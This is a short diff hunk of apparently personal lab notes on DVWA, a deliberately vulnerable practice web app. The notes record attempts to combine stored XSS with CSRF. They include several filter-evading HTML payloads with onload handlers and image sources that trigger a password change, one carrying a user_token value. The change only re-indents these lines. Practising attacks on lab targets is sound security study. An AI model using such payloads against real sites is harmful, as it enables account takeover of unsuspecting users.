@@ -49,7 +49,7 @@
   * Since the request will contain my unique cookie, I don't have to specify it in the payload.
   * I've attempted to go back to the XSS (Stored) page on the same security level and enter this into the name field with no alerts popping up:
    <img<meta>><<meta>img onload=alert(1) src="/dvwa/vulnerabilities/csrf/?password_new=pswd&password_conf=pswd&Change=Change">
-  * Instead of using the <img<meta>> tag, I did <body<meta>><<meta>body onload=alert(1) src="/dvwa/vulnerabilities/csrf/?password_new=pswd&password_conf=pswd&Change=Change">
-    which seems to have worked and an alert window shows, but no requests are made to the /csrf/ location on Burp.
-  * <body<meta>><<meta>body onload=alert(1)><<meta>img src="/dvwa/vulnerabilities/csrf/?password_new=pswd&password_conf=pswd&Change=Change> makes requests to /csrf/, but it doesn't change the password.
-  * <body<meta>><<meta>body onload=alert(1)><<meta>img src="/dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change&user_token=4202d63409c601b9230b4834ffa92a89">
+      * Instead of using the <img<meta>> tag, I did <body<meta>><<meta>body onload=alert(1) src="/dvwa/vulnerabilities/csrf/?password_new=pswd&password_conf=pswd&Change=Change">
+        which seems to have worked and an alert window shows, but no requests are made to the /csrf/ location on Burp.
+      * <body<meta>><<meta>body onload=alert(1)><<meta>img src="/dvwa/vulnerabilities/csrf/?password_new=pswd&password_conf=pswd&Change=Change> makes requests to /csrf/, but it doesn't change the password.
+      * <body<meta>><<meta>body onload=alert(1)><<meta>img src="/dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change&user_token=4202d63409c601b9230b4834ffa92a89">
